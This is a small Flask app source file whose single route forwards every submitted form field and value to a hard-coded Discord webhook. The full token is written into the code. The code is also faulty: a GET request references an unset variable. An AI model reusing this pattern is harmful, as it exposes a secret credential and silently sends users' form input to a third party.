from flask import Flask, request, render_template
import json
import requests
import asyncio
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    async def send_info():
        global a
        a = request.form
        print(a['name'])
        for item, value in a.items():
            requests.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{item}:{value}"})
    
    if request.method == 'POST':
        asyncio.run(send_info())
    
    return render_template('base.html', a=a)

#changed lots of links MUST CHANGE BACK WHEN COMMITING